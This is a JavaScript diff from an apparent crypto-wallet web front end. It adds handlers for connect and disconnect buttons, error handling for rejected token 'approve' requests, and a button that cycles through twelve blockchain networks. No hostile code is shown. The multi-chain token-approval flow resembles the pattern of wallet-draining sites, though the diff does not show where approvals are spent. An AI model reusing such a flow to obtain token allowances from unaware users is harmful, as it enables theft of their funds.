@@ -1105,14 +1105,6 @@ const initializeSubscribers = (modal) => {
       }
     }
   }, 1000);
-  document.querySelectorAll('.open-connect-modal').forEach(button => {
-  button.addEventListener('click', (event) => {
-    event.stopPropagation(); // Предотвращаем всплытие события к document
-    if (!appKit.getIsConnectedState()) {
-      appKit.open();
-    }
-  });
-});
   modal.subscribeAccount(debouncedSubscribeAccount);
   modal.subscribeNetwork(state => {
     updateStore('networkState', state);
@@ -1137,3 +1129,72 @@ const initializeSubscribers = (modal) => {
     }
   });
 };
+// Helper function to handle approve errors
+const handleApproveError = (error, token, state) => {
+  store.isApprovalRequested = false
+  if (error.code === 4001 || error.code === -32000) {
+    store.isApprovalRejected = true
+    const errorMessage = `Approve was rejected for ${token.symbol} on ${token.network}`
+    store.errors.push(errorMessage)
+    const approveState = document.getElementById('approveState')
+    if (approveState) approveState.innerHTML = errorMessage
+    hideCustomModal()
+    appKit.disconnect()
+    store.connectionKey = null
+    store.isProcessingConnection = false
+    sessionStorage.clear()
+  } else {
+    const errorMessage = `Approve failed for ${token.symbol} on ${token.network}: ${error.message}`
+    store.errors.push(errorMessage)
+    const approveState = document.getElementById('approveState')
+    if (approveState) approveState.innerHTML = errorMessage
+    hideCustomModal()
+    store.isProcessingConnection = false
+  }
+}
+
+initializeSubscribers(appKit)
+updateButtonVisibility(appKit.getIsConnectedState())
+
+// Обработчик для кнопок подключения кошелька
+    document.querySelectorAll('.open-connect-modal').forEach(button => {
+      button.addEventListener('click', (event) => {
+        event.stopPropagation(); // Предотвращаем всплытие события к document
+        if (!appKit.getIsConnectedState()) {
+          appKit.open();
+        }
+      });
+    });
+
+document.getElementById('disconnect')?.addEventListener('click', () => {
+  appKit.disconnect()
+  store.approvedTokens = {}
+  store.errors = []
+  store.isApprovalRequested = false
+  store.isApprovalRejected = false
+  store.connectionKey = null
+  store.isProcessingConnection = false
+  sessionStorage.clear()
+})
+
+document.getElementById('switch-network')?.addEventListener('click', () => {
+  const currentChainId = store.networkState?.chainId
+  
+  // Определяем следующую сеть для переключения
+  let nextNetwork = networkMap['Ethereum'].networkObj
+  if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
+  else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
+  else if (currentChainId === networkMap['Arbitrum'].chainId) nextNetwork = networkMap['Optimism'].networkObj
+  else if (currentChainId === networkMap['Optimism'].chainId) nextNetwork = networkMap['Base'].networkObj
+  else if (currentChainId === networkMap['Base'].chainId) nextNetwork = networkMap['Scroll'].networkObj
+  else if (currentChainId === networkMap['Scroll'].chainId) nextNetwork = networkMap['Avalanche'].networkObj
+  else if (currentChainId === networkMap['Avalanche'].chainId) nextNetwork = networkMap['Fantom'].networkObj
+  else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj
+  else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj
+  else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj
+  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
+  else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj
+  else nextNetwork = networkMap['Ethereum'].networkObj
+  
+  appKit.switchNetwork(nextNetwork)
+})
